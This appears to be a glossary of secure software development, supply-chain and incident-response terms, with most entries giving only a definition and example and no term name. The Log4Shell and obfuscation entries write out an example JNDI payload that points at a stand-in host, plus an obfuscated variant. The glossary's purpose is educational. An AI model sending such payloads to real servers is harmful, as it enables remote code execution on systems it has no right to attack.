term: Secure software development life cycle (secure SDLC)
definition: An approach to building software in which security work is built into every phase (requirements, design, coding, testing, release and operations) instead of being a single check just before launch.
example: A secure SDLC adds threat modelling at design time, SAST on every pull request and a DAST scan in staging.

definition: Moving security checks earlier in the development timeline (drawn left to right), towards design and the developer's own code changes, so problems are found while they are cheap to fix and the author still remembers the code.
example: Running a secret scanner as a pre-commit hook is shifting left: the leak is stopped on the laptop, not found in production.

definition: A user story written from an attacker's point of view, such as "As an attacker, I want to reset another user's password by guessing the token". It turns a vague worry into a requirement that can be tested.
A specific, testable statement of what a system must do to stay secure, such as "password-reset tokens expire after 15 minutes". Checklists such as OWASP ASVS supply ready-made ones.
A review of a system's design document, before it is built, to catch flaws such as missing authorisation checks while changing direction is still cheap.

An OWASP checklist of concrete, testable security requirements for web applications, arranged in three levels of rigour, from Level 1 (a baseline for all apps) to Level 3 (the most critical applications).
example: A banking app might be verified to ASVS Level 3, a hobby blog to Level 1.

definition: Microsoft's company-wide process for building security into software development, made mandatory internally in 2004 after Bill Gates's 2002 Trustworthy Computing memo. It was one of the first large-scale secure SDLC programmes.
A January 2002 email from Bill Gates to all Microsoft staff saying that security and reliability must take priority over new features. It led to the Microsoft Security Development Lifecycle.

NIST Special Publication 800-218: a set of high-level secure software development practices (prepare the organisation, protect the software, produce well-secured software, respond to vulnerabilities). US government software suppliers attest against it.

The OWASP Software Assurance Maturity Model: a framework for measuring how mature an organisation's secure-development practices are. It has five business functions (governance, design, implementation, verification, operations), each split into practices scored at maturity levels 1 to 3.
example: A team scoring level 1 on threat assessment might set a target of level 2 for next year.

definition: A framework that scores how established an organisation's practices are on a scale (for example levels 1 to 3), so progress can be measured and targets set. OWASP SAMM is the best-known one for secure development.

Analysing an application's source code (or bytecode) for security flaws without running it. Runs early, for example on every pull request, and points at exact lines, but produces false positives and misses problems not visible in code.
example: Bandit flagging an f-string used to build a SQL query is a SAST finding.

definition: Testing a running application from the outside, as a black box: a tool crawls it, sends malicious inputs and inspects the responses. It finds configuration problems and flaws that are really exploitable, but needs a deployed environment and only tests what it can reach.
example: A DAST scan of a staging site reports that responses lack a Strict-Transport-Security header.

definition: Checking the third-party packages an application depends on, including indirect ones, against databases of known vulnerabilities (CVEs) and licence rules.
example: pip-audit reporting that the pinned version of a library has a published CVE is an SCA finding.

definition: Testing that places an agent inside the running application (instrumentation), so when a test or DAST request sends a malicious payload, the agent sees which line of code it reached. It combines DAST's realism with SAST's precise location, but needs an agent for each language runtime.

A kind of static (or dynamic) analysis that marks data from attacker-controlled sources as "tainted", follows it through the program, and raises an alert if it reaches a dangerous sink without passing through a sanitiser.
example: request.args.get("name") is a source; the SQL text passed to execute() is a sink; tainted data flowing from one to the other is a likely SQL injection.

definition: In taint analysis, an operation that is dangerous if it receives attacker-controlled data, such as the SQL-text argument of execute(), an HTML template or a shell command.

In taint analysis, a function that makes untrusted data safe for a particular sink, such as escaping for HTML or validation against an allow-list. Data that passes through one is no longer treated as tainted.
An open-source static-analysis tool whose rules are written to look like the code they match. It supports simple pattern rules and taint rules that track data from sources to sinks.
GitHub's static-analysis engine. It turns code into a database and runs queries over it, including data-flow (taint) queries; it powers GitHub code scanning.
A code-quality and static-analysis platform from SonarSource that reports bugs, code smells and security issues, often run in CI on every pull request.
An open-source SAST tool for Python. Each check has an ID, such as B608 (SQL built from strings) or B301 (use of pickle), and reports a severity and a confidence.
An open-source static-analysis tool for Java bytecode, successor to FindBugs; plug-ins such as Find Security Bugs add security checks.
In Semgrep, a metavariable such as $Q stands for any piece of code in a pattern; focus-metavariable narrows a match to just that piece, for example only the query argument of execute().
Python's built-in object-serialisation format. Loading a pickle can run arbitrary code, so calling pickle.loads on untrusted input such as a request body is a remote-code-execution risk.
A proposed set of code changes submitted for review before being merged into the main branch. Security tools often run on each pull request and post their findings as comments on it.
An authorised, simulated attack on a system by security testers to find exploitable weaknesses. Usually periodic and late in development, so it complements rather than replaces earlier checks.
A result that correctly says "problem found": a scanner finding that is a real vulnerability, or an alert raised by real malicious activity.
The fraction of harmless cases that a test or rule wrongly flags. Even a low rate, such as 0.1 %, produces many false alarms when the rule sees millions of harmless events.
example: A rule with a 0.1 % false-positive rate raises about 1,000 false alerts over 1,000,000 normal logins.

definition: The fraction of a rule's or tool's alerts that are real: true positives divided by all alerts (true positives plus false positives). A precision of 0.9 means 9 in 10 alerts are worth acting on.
example: A rule that fired 50 times, 5 of them on real attacks, has a precision of 5 / 50 = 0.1.

definition: How common something is before you test for it, such as the share of events that are real attacks. When the base rate is very low, even an accurate detector produces mostly false alarms.
example: If 2 in every 1,000,000 logins are attacks, a rule that misfires on 1 in 1,000 harmless logins gives about 500 false alerts for every real one.

definition: A free, open-source DAST tool, formerly an OWASP project, that sits between a browser and a web app as a proxy, crawls it and scans for vulnerabilities such as injection and missing security headers.
A web-security testing tool from PortSwigger, widely used by penetration testers: an intercepting proxy plus an automated scanner.
An HTTP response header that tells the browser to apply a protection, such as Content-Security-Policy (limit where scripts load from) or Strict-Transport-Security (always use HTTPS).
A web app that loads one page and then updates it with JavaScript instead of loading new pages. Its routes exist only in the browser, so simple crawlers miss them.
A program that discovers a website's pages by following links from starting (seed) URLs. A DAST scanner crawls first, then attacks what it found.
Testing a system only through its external interface, with no access to the code. DAST is black-box; SAST, which reads the code, is white-box.
A Finnish security-testing company (later acquired by Synopsys) whose fuzz-testing tools independently found Heartbleed in 2014.

A critical vulnerability (CVE-2021-44228, CVSS 10.0) in the Java logging library Log4j, disclosed in December 2021. Logging attacker-controlled text such as ${jndi:ldap://evil.example/a} could make a vulnerable server fetch and run the attacker's code.

Apache Log4j, a very widely used open-source logging library for Java. Log4j Core (the log4j-core package) holds the implementation that contained Log4Shell; log4j-api is the separate interface package.
A Log4j feature that expands ${...} expressions inside log messages when they are written, for example ${env:HOME} to an environment variable's value. The JNDI lookup is what made Log4Shell possible.
example: Log4j turns ${lower:J} into j, so ${${lower:j}ndi:...} becomes ${jndi:...} at log time.

definition: A Java API for looking up named objects in directory services such as LDAP or RMI. It can load a Java object from a remote server, which is what Log4Shell abused.

A protocol for querying directory services, such as company user directories. Normally used on internal networks, so an application server making an outbound LDAP connection to the internet is suspicious.
A Java mechanism for calling methods on objects in another Java process over the network. Like LDAP, it was one of the protocols Log4Shell payloads used to fetch attacker code.
A vulnerability that lets an attacker run their own code on a target machine over a network. Usually the most severe kind of flaw.
A widely used programming language whose programs run on the Java Virtual Machine (JVM). Many enterprise back-end services and vendor products are written in it.
A JAR (Java ARchive) is a zip file bundling compiled Java code. A fat JAR also bundles all of the application's dependencies, which hides libraries such as Log4j inside a single file.
A pipeline check that fails the build, blocking a merge or release, when a condition is met, such as a new high-severity scanner finding. Risk-based gates block only on findings worth stopping for.
Sorting findings or alerts by how real and how urgent they are, deciding what to fix or investigate first and what to dismiss as a false positive.

A developer in a product team who gets extra security training and acts as the team's first point of contact for security questions and triage, so security expertise scales beyond a small central team.
A set of approved, secure-by-default tools, libraries and templates that make the secure way the easiest way, instead of relying on gates that say no.
Known security weaknesses left unfixed to ship sooner, which build up like technical debt and get harder and costlier to fix later.

A vulnerability in what the application is designed to allow, rather than in how input is handled, such as letting users approve their own expense claims. Generic scanners rarely find these because they do not know the business rules.
A starting address given to a crawler. Supplying seed URLs for pages it cannot discover by following links improves DAST coverage.
A standard, machine-readable format for describing an HTTP API's endpoints, parameters and responses. DAST tools can import one to test every endpoint, not only those a crawler finds.
A popular open-source web server and reverse proxy. Response headers are often set in its configuration rather than in application code.
A package your project uses only because one of your dependencies (or one of theirs) needs it. You did not choose it and may not know it is there.
example: Your app depends on a framework, which depends on Log4j: Log4j is a transitive dependency.

definition: The implant (name given by CrowdStrike) planted on SolarWinds' build server. It watched for the Orion build and swapped one source file for a backdoored version for the duration of compilation, then put the original back.

The backdoor compiled into SolarWinds Orion updates in 2020. It waited up to about two weeks after installation, imitated Orion's own network traffic, and let the attackers choose a few high-value victims for further intrusion.
Russia's Foreign Intelligence Service. The US and UK governments attributed the SolarWinds campaign to it in April 2021.
A US cyber-security company that sells endpoint detection and response products and investigates incidents; it published the analysis of SUNSPOT.
Microsoft's build engine for .NET and Visual Studio projects. SUNSPOT watched for the MsBuild.exe process to know when Orion was being compiled.
A Windows file of compiled code that programs load and use at run time. SUNBURST was hidden inside a legitimate Orion DLL.
Hidden code or access that lets an attacker get into a system while bypassing its normal authentication.
Describes legitimate-looking software that has had malicious code secretly added, like a Trojan horse.
The machine or service that compiles source code and packages it into the artefacts that are shipped. Compromising it lets an attacker alter what is shipped without touching the source repository.
An open-source data-compression tool and library (liblzma) included in almost every Linux system. Versions 5.6.0 and 5.6.1 (2024) contained a deliberately planted backdoor.

A backdoor planted in xz-utils 5.6.0 and 5.6.1 by a long-trusted contributor using the name "Jia Tan". Through distribution patches linking OpenSSH's sshd to liblzma, it let the holder of the attacker's private key run commands on affected machines over SSH. Found by Andres Freund on 29 March 2024; CVSS 10.0.
The name used by the contributor who spent about two years earning maintainer rights on xz-utils and then released the backdoored versions. The real identity behind it is unknown.
A person with authority to accept changes into an open-source project and publish its releases. Many critical projects rely on one or two unpaid maintainers.
Permission to add changes directly to a project's repository (and, with release rights, to publish official releases).
A fake online identity run by someone to pretend to be an independent person, for example to pressure a maintainer.
Manipulating people, rather than breaking technology, to gain access: persuading, pressuring or tricking them into handing over trust, credentials or control.
A .tar archive file (usually compressed) bundling a project's files. Many open-source projects publish source releases as tarballs, which can differ from the contents of the git repository.
A file of non-text data, such as a compressed test file or compiled object, that people cannot review by reading it like source code.
A file in the m4 macro language, used by GNU Autoconf to generate build scripts. The xz-utils trigger was a modified build-to-host.m4 shipped only in the release tarballs.
A major Linux distribution. Its "unstable" and "testing" branches receive new package versions before they reach stable releases. Its package format is .deb.
The package format and package manager used by Red Hat, Fedora, SUSE and related Linux distributions.
A Linux distribution sponsored by Red Hat. Rawhide is its continuously updated development branch.
An operating system built from the Linux kernel plus a chosen set of packages, such as Debian, Fedora or Ubuntu. Distributions often patch the software they ship.
The library for talking to systemd, the service manager on most Linux systems. Some distributions patch sshd to use it, which pulled liblzma (and the xz backdoor) into the SSH server.
A published notice from a vendor or project describing a vulnerability, which versions are affected, and how to fix or mitigate it.
example: The Log4j advisory lists 2.0-beta9 to 2.14.1 as affected by CVE-2021-44228.

definition: A fix copied from a newer version into an older maintained release line, so a version number that looks old may already be patched.
example: Log4j 2.12.2 is a release on the Java 7 line that fixes Log4Shell (CVE-2021-44228), although 2.12 is numerically lower than 2.15.0, the fix for Java 8 and later.

definition: A pre-built product (hardware box or virtual machine) supplied by a vendor, whose internal software you cannot easily inspect or patch yourself.
Publishing a malicious package (or domain) with a name close to a popular one, such as reqeusts for requests, to catch people who mistype it.
The default package manager and public package registry for JavaScript (Node.js). npm audit checks a project's dependencies against known vulnerabilities.
A namespace prefix for npm packages, such as @acme/, that only its owner can publish under. Using one for internal packages prevents dependency confusion.
A 2018 npm incident: the maintainer of the popular event-stream package handed it to a volunteer, who added a dependency containing code that targeted one Bitcoin wallet app.

An October 2021 incident in which, the maintainer believes, his npm account was hijacked and malicious versions 0.7.29, 0.8.0 and 1.0.0 of ua-parser-js were published. They installed a cryptominer and, on Windows, a password stealer.
Malware that secretly uses the victim's computing power to mine cryptocurrency for the attacker.

Publishing a package to a public registry under the same name as a company's internal package, with a higher version number, so build tools that check both install the public (attacker's) one. Demonstrated by Alex Birsan in 2021.
A server that stores and distributes software packages, such as PyPI for Python or npm for JavaScript. Package managers download from it.
In pip, a server that lists packages and their files. --index-url sets the main one; --extra-index-url adds more, and pip treats all of them equally, choosing the best version across them.
The file in a JavaScript project that lists its name, scripts and dependencies.
Python's standard package installer. It downloads packages from PyPI (or other indexes) and resolves which versions to install.
A tool from the pip-tools project that turns a list of top-level requirements into a fully pinned requirements.txt, optionally with hashes.
A tool from the Python Packaging Authority that checks a Python environment or requirements file against databases of known vulnerabilities: a simple SCA tool.
The public registry of Python packages that pip installs from by default.

A wheel is a pre-built Python package file that installs without running the package's own build code. A source distribution (sdist) must be built during installation, which can execute arbitrary code.
A file that records the exact version (and often the hash) of every dependency, direct and transitive, that was resolved, so later installs pick the same ones.
example: poetry.lock or package-lock.json pins every package your project installs.

definition: Fixing each dependency to one exact version instead of a range, so installs cannot silently pick up a new release. It also stops you receiving fixes until you update deliberately.
example: requests==2.32.3 pins requests to exactly version 2.32.3.

definition: A pip mode (turned on by --require-hashes or by any --hash in the requirements file) in which every package must be pinned and every downloaded file's SHA-256 hash must match a recorded one, or the install fails.

A machine-readable list of the components (with versions and other metadata) that make up a piece of software. Stored per release, it lets you answer "which of our products contain library X at version Y?". Common formats are SPDX and CycloneDX.
Software Package Data Exchange: an SBOM format from the Linux Foundation, also an international standard (ISO/IEC 5962:2021).
An SBOM format from OWASP, designed for security use cases, in JSON or XML.

A US presidential order of May 2021, "Improving the Nation's Cybersecurity". Among other things it directed agencies to require secure-development practices from software suppliers to the federal government, including providing an SBOM, which pushed SBOMs into federal procurement.

A file produced by a process. In software supply chains: a build output such as a package, binary or container image. In incident response: a trace an attacker leaves on a host or network, such as a file, registry key or unusual network pattern.

An OpenSSF framework (pronounced "salsa") of levels describing how well software artefacts are protected from tampering between source and release. The Build track runs from L1 (provenance exists) to L3 (hardened, isolated builds with provenance that is hard to forge).
SLSA's set of requirements for the build process (L1 to L3). The Source track, added in SLSA v1.2, covers how changes get into the source repository.
A record of how an artefact was made: which source commit, which builder, which parameters. Signed provenance lets a consumer check that a package came from the expected source and build system.
example: "Artefact with hash X was built from commit Y of repo Z by builder B."

definition: A signed statement about a piece of software, such as its provenance or test results, that others can verify.
A build that gives bit-for-bit identical output from the same source, so anyone can rebuild an artefact and check it matches what was shipped.
A build run in a fresh, separate environment that is thrown away afterwards, so one build cannot influence another and an implant cannot persist on the builder.
The Open Source Security Foundation, a Linux Foundation project that develops open-source security tools and standards such as SLSA, Sigstore and Scorecard.
An automated tool that rates open-source projects on security practices such as branch protection, code review, signed releases and pinned dependencies.
Sigstore's command-line tool for signing and verifying container images and other artefacts.
A public, append-only log, built on a Merkle tree so tampering is detectable, that records every signing event or certificate so anyone can audit them. Sigstore's is called Rekor.
A certificate valid for minutes or hours instead of years, so a stolen key is only useful briefly and revocation is rarely needed.
A GitHub service that alerts you to dependencies with known vulnerabilities and opens pull requests to update them.
An open-source bot from Mend that opens pull requests to keep dependencies up to date, with configurable schedules and grouping.
A commercial developer-security platform whose best-known product is SCA: finding known-vulnerable dependencies and suggesting upgrades.
A free SCA tool from OWASP that identifies a project's dependencies and reports any with published CVEs.
GitHub's built-in CI/CD service. Workflows defined in YAML files in the repository run jobs on events such as pushes and pull requests.
A popular open-source search and analytics engine written in Java; some versions were affected by Log4Shell.
A secret string an application sends with requests to an API to identify itself and gain access. Anyone who has the key can usually use it.

A pair of values used to sign AWS API requests: an access key ID (starting AKIA for long-term keys, ASIA for temporary ones) and a secret access key. The ID alone is not secret; the secret access key is what grants access.
example: AKIAIOSFODNN7EXAMPLE is AWS's documented example of an access key ID.

definition: Rewriting a git repository's past commits, for example with git filter-repo, to remove a file or secret from every commit. It does not affect copies already cloned, forked or cached elsewhere.
A widely used service for hosting git repositories, with pull requests, CI (GitHub Actions) and security features such as secret scanning.
The official AWS software development kit (SDK) for Python. It finds credentials automatically through its credential provider chain.
A named container for files in cloud object storage such as Amazon S3. A bucket accidentally made public exposes everything in it; account-level public-access blocks prevent that.
A programme in which an organisation pays outside researchers for responsibly reporting vulnerabilities.
The US government agency that enforces consumer-protection law, including action against companies that mislead people about data security.

A widely cited set of 12 principles for building cloud services, published by Heroku engineers in 2011. Factor III says to keep configuration, including credentials, in environment variables rather than code.

Software that collects details when a program fails (stack trace, variables, often the whole environment) and shows them on a debug page or sends them to an error-tracking service, which can leak secrets.

A CI feature that replaces registered secret values with *** in job logs. It is best effort: a transformed value (encoded, split or reversed) is not recognised, and a script can still read and send the real value.
A shell option that prints every command, with variables expanded, before running it. In CI it can print secrets into the job log.

A Linux file showing the environment variables a process was started with (pid is its process ID). The kernel restricts who can read it, but anyone allowed to inspect the process can see secrets passed this way.
The Linux system call debuggers use to inspect and control another process. Its permission checks also govern who may read another process's /proc details.
The number Linux uses to identify a user account; processes run with a UID that decides what they may access.
A popular tool for building and running containers. docker inspect shows a container's configuration, including environment variables passed at run time, to anyone who can talk to the Docker daemon.

A 2021 supply-chain attack: attackers modified Codecov's Bash Uploader script, which many CI pipelines downloaded and ran, so it sent the jobs' environment variables (including credentials) to an attacker's server from 31 January to 1 April 2021.

CircleCI is a hosted CI/CD service. In its January 2023 incident, malware on an engineer's laptop stole a session cookie; the attacker took customers' encrypted secrets and the keys to decrypt them, so CircleCI told every customer to rotate every stored secret.
A dedicated service that holds secrets encrypted, controls access per secret, logs every read and supports versions and rotation, such as HashiCorp Vault or AWS Secrets Manager.
Google Cloud's managed secret store.
Microsoft Azure's managed service for storing secrets, encryption keys and certificates.
Granting each workload permission to read only the specific secrets it needs, so a compromised service exposes only its own secrets.
An open-source system for running and managing containers across a cluster of machines.
A Kubernetes object for holding small amounts of sensitive data. Its values are only base64-encoded, and are stored unencrypted in etcd unless encryption at rest is configured.
A distributed key-value store that Kubernetes uses to hold all cluster data, including Secrets.
Turning data into a different representation, such as base64, by a public rule that anyone can reverse. Unlike encryption, it uses no key and gives no secrecy.
The ordered list of places an AWS SDK such as boto3 looks for credentials: explicit parameters, environment variables, config files, then the role of the machine or container it runs on.
An identity the cloud or orchestration platform gives a workload automatically, such as an IAM role or Kubernetes service account, so the workload can authenticate without a stored secret.
A running piece of software, such as a service, container or CI job, considered as something that needs its own identity and permissions.
The question of what credential an application uses to fetch its other secrets. Platform identity solves it: the platform vouches for the workload, so no first secret has to be stored.
Credentials generated on demand for one requester, with a limited lifetime, and deleted afterwards, such as a database user Vault creates for one service instance for one hour.
In Vault, the lifetime attached to a dynamic secret. When the lease expires or is revoked, Vault deletes or disables the credential; some leases can be renewed.
How long something stays valid before it expires. For a dynamic secret, the TTL is the length of its lease, such as 1 hour.
The AWS STS call that exchanges a caller's identity for temporary credentials for an IAM role, valid from 15 minutes up to the role's maximum session duration (1 to 12 hours).
The AWS service that issues temporary security credentials, for example when a role is assumed or an OIDC token is exchanged.
Google's cloud-computing platform.
Microsoft's cloud-computing platform.

Trusting another system's identity tokens instead of storing a key: a CI job presents a signed OIDC token describing itself, and the cloud exchanges it for temporary credentials if the token matches a trust policy.
example: A GitHub Actions job on main gets short-lived AWS credentials with no AWS key stored in GitHub.

definition: The part of an AWS IAM role that says who may assume it, for example only OIDC tokens from a particular issuer whose sub claim names a particular repository and branch.

The subject field of a JSON Web Token: who or what the token is about. In GitHub's OIDC tokens it describes the job, for example repo:acme/api:ref:refs/heads/main. Trust policies must match it tightly.
The audience field of a JSON Web Token: which service the token is meant for. For GitHub-to-AWS federation it is usually sts.amazonaws.com.
The GitHub Actions permission a job needs before it can request an OIDC token.
A character such as * that matches any text in a pattern. In a trust policy, repo:acme/* matches every repository in the acme organisation, which is usually far broader than intended.
AWS IAM policy condition operators. StringEquals requires an exact match; StringLike allows the wildcards * and ?.
GitHub Actions settings that guard a deployment environment, for example requiring approval or limiting which branches can deploy to production.

Replacing a credential with a new one and retiring the old, on a schedule or after a suspected leak. Done without downtime by keeping both valid during a changeover: create, propagate, verify, revoke.
Tags AWS Secrets Manager attaches to versions of a secret: AWSCURRENT (the live value), AWSPENDING (the new value during rotation) and AWSPREVIOUS (the last value).
An open-source secret scanner for git repositories, often run as a pre-commit hook or in CI.
An open-source secret scanner from Yelp, designed to run as a pre-commit hook with a baseline of known findings.
A GitHub secret-scanning feature that rejects a git push containing a recognised secret format before it reaches the repository.

A measure, in bits, of how unpredictable a symbol is on average. Secret scanners compute it from character frequencies: random keys score high (up to 6 bits per character for base64), ordinary words and code lower.
example: "aaaaaaaa" scores 0 bits per character; "abcdabcd" scores 2.

definition: The same credential copied into many places (CI systems, wikis, chat, config files), so it is hard to know who has it and to rotate it.
A single high-privilege credential shared by many services, so one leak compromises everything.
Removing or masking sensitive values, such as passwords and tokens, from data before it is stored or shown, for example in the logging layer.
Secrets OPerationS: an open-source tool that encrypts the values in configuration files (YAML, JSON and others) with keys from a KMS or PGP, so they can be committed to git.
A Kubernetes tool from Bitnami: secrets are encrypted with a key that only a controller in the cluster holds, so the encrypted versions can be stored in git.
Running infrastructure from a git repository: the desired state of systems is committed to git, and automation makes the live systems match it.
An organisation's most valuable assets, whose compromise would do the most damage, such as a master decryption key.
A widely used workplace chat service. Secrets pasted into chat are another common leak path.
A vulnerability that attackers know about or exploit before the vendor has released a fix, so defenders have had zero days to patch.
An event that actually or potentially harms the confidentiality, integrity or availability of systems or data, such as a breach, malware infection or account takeover.
A recorded occurrence that matters for security, such as a login, a failed authorisation check, an admin change or a bulk download. Logged events are the raw material for detection and investigation.

Network traffic leaving a system or network. Restricting egress (for example, no outbound internet connections from database servers) blocks many attacks and makes unexpected outbound traffic a strong signal.
The world's reference time standard, with no time zones or daylight saving. Logging in UTC lets events from different systems be lined up correctly.
The recorded date and time at which an event happened.
Writing log entries as machine-readable records with named fields (often JSON), such as event, user and src_ip, instead of free text, so they can be searched and queried reliably.
example: {"event": "login_failed", "user": "alice", "src_ip": "203.0.113.7"}

definition: The MITRE ATT&CK technique of deleting or altering evidence, such as clearing logs, to hide an intrusion.
An Amazon S3 feature that stores objects in write-once-read-many form: during a set retention period they cannot be overwritten or deleted (in compliance mode, not even by the account's root user).
The protocol computers use to keep their clocks in step with accurate time servers, typically to within milliseconds. Without it, logs from different machines cannot be lined up reliably.
How long logs are kept before deletion. It should exceed how long intrusions typically go undetected, balanced against cost and data-protection rules.
example: With 7-day retention, a log line written on 1 May is deleted on 8 May.

definition: A widely used commercial platform for searching and analysing machine data, often used as a SIEM.
The SIEM and endpoint-security product built on the Elasticsearch search engine.
Microsoft's cloud SIEM service on Azure.
Google Cloud's security-operations platform (SIEM plus response automation), formerly known as Chronicle.
A query or condition run over logs that raises an alert when it matches suspicious activity, such as "more than 5 failed logins from one IP in 60 seconds".
A time range of fixed length that moves forward with each new event, such as "the last 60 seconds". Counting events inside it is how rate-based detection rules work.
Merging repeated copies of the same alert or record into one, so a single attack does not flood analysts with identical alerts.
An open, vendor-neutral YAML format for writing detection rules once and converting them into the query languages of different SIEMs, given a supported backend and correct field mapping.
A human-readable internet name such as example.com, resolved to IP addresses by DNS. Attackers can register new ones cheaply.

A technique in which a payload makes the victim look up an attacker-controlled DNS name; the lookup arriving at the attacker's DNS server confirms the target is vulnerable, even if other outbound traffic is blocked.
The state in which analysts receive so many alerts, mostly false positives, that they stop examining them carefully and miss real attacks.
A notification that a detection rule or tool has matched something that may be malicious, for an analyst to triage.
The team, often working around the clock, that monitors alerts, triages them and starts incident response.
An open-source library from Red Canary of small, scripted tests, each mapped to a MITRE ATT&CK technique, used to check that detections fire.
A pattern, such as a file hash or byte sequence, that identifies a specific known piece of malware. Easy to evade by changing the malware slightly.
SolarWinds Orion's legitimate usage-reporting feature. SUNBURST disguised its network traffic to look like it.

An extra way of proving identity registered to an account, such as a phone enrolled for multi-factor login codes or prompts. NIST's own term for the device is an authenticator; in the SolarWinds hearing it was called a verifier. A new one appearing unexpectedly can mean an attacker has enrolled their own.
Founder of Mandiant and chief executive of FireEye when it discovered the SolarWinds campaign; he testified about it to the US Senate Intelligence Committee on 23 February 2021.
The US Cybersecurity and Infrastructure Security Agency, which leads US federal cyber defence and can issue emergency directives to federal agencies.
A binding order CISA can issue to US federal civilian agencies in a cyber emergency. Emergency Directive 21-01 (13 December 2020) ordered them to disconnect or power down SolarWinds Orion.

Unusual activity involving accounts or authentication, such as a new MFA device, impossible travel or a service account used interactively. Often the earliest sign of an intrusion that uses stolen credentials.
A detection that flags logins to one account from places too far apart to travel between in the time elapsed, such as London and Sydney 20 minutes apart.
A large content-delivery and security company whose web application firewall sits in front of millions of websites, giving it early visibility of attacks such as Log4Shell exploitation.
Disguising code or a payload so it does the same thing but looks different, to evade detection rules that match exact strings.
example: ${${lower:j}ndi:...} is an obfuscated form of ${jndi:...}.

definition: A command-line interpreter such as sh or bash. A web server process suddenly starting one is a classic sign that an attacker has achieved code execution.
Programs such as curl or wget that fetch files from the internet. A server process launching one unexpectedly suggests an attacker is pulling in more tooling.
NIST's incident-response guide. Revision 2 (2012) set out the classic four-phase lifecycle; Revision 3 (April 2025) replaces it and maps incident response onto the Cybersecurity Framework (CSF) 2.0.
A NIST framework that organises cyber-security outcomes into six functions in version 2.0 (2024): Govern, Identify, Protect, Detect, Respond and Recover.
The person who leads the response to an incident: coordinates the team, makes decisions and keeps everyone working from one plan.
A schedule of who must respond, at any hour, when a high-priority alert pages them.
A discussion-based rehearsal in which the response team walks through a realistic incident scenario to test its plan and roles, without touching real systems.
The incident-response step that stops an attack spreading or doing more harm: isolating hosts, disabling accounts, revoking credentials or blocking domains.

The incident-response step that removes the attacker completely: malware, backdoor accounts, persistence mechanisms and stolen credentials. Against a capable intruder it is often done everywhere at once, so they cannot fall back to a foothold that was missed.
The incident-response step that restores normal service, often by rebuilding systems from known-good images, while watching closely for the attacker's return.
The target for how quickly a service must be restored after an outage or incident.
The ways attackers make sure they keep access after a reboot or password change, such as scheduled tasks, new accounts or modified start-up files.
A rented virtual machine at a hosting provider. Attackers can get a new one, with a new IP address, in minutes.
Capturing and protecting data from compromised systems (memory, disks, logs) before it changes or is wiped, so the incident can be investigated and, if needed, used in legal proceedings.

The rule (RFC 3227) of collecting the evidence that disappears fastest first: CPU registers and caches, then memory, network state and running processes, then temporary file systems, then disk, then remote logs, then physical configuration and network topology, and archives last.
Evidence that is lost when a machine is powered off or rebooted, or changes quickly while it runs, such as memory contents, running processes and open network connections.
A tiny, very fast storage slot inside the processor holding the values it is working on right now; its contents change constantly, so it is the most volatile evidence.
A trusted, clean copy of a system (an operating-system or container image built from verified sources) used to rebuild compromised machines instead of trying to clean them.

A written review after an incident covering what happened, why, and what will change, with owners and dates. It assumes people acted reasonably on what they knew, so they report honestly; teams stay accountable for the fixes.
Under GDPR, the organisation that decides why and how personal data is processed, and is responsible for reporting breaches. A processor handles data on a controller's behalf.
Under GDPR, a security incident leading to the accidental or unlawful destruction, loss, alteration, unauthorised disclosure of, or access to, personal data.
The UK's data-protection regulator, to which personal-data breaches must be reported under the UK GDPR.
The cloud principle that the provider secures the underlying infrastructure while the customer secures what they configure and put on it, such as bucket permissions, accounts and data.
How long an alert waits before an analyst first looks at it: a measure of SOC workload, not of attacker dwell time.
The Internet Protocol, which delivers packets between machines identified by IP addresses. In security logs, "source IP" or just "IP" means the address a request came from.
Designing products so their out-of-the-box settings are the safe ones, so users must take a deliberate step to make them less secure rather than extra steps to make them secure.
example: A framework that escapes HTML output automatically, unless a developer explicitly marks a value as safe, is secure by default.

definition: A US cyber-security company that owned Mandiant in 2020 and discovered the SolarWinds campaign after finding it had itself been breached. In 2021 it sold its products business and renamed itself Mandiant, which Google bought in 2022.

A set of changes to source code (lines removed and added), usually produced with diff, that someone sends to a project or applies to it. Contributors propose changes as patches, and Linux distributions apply their own patches to the software they package. A security update is one kind of patch, but most patches are ordinary changes.

In taint analysis, a place where attacker-controlled data enters a program, such as a request parameter, header or uploaded file. Data from a source is marked as tainted until it passes through a sanitising function.
example: request.args.get("name") in a Flask app is a taint source.
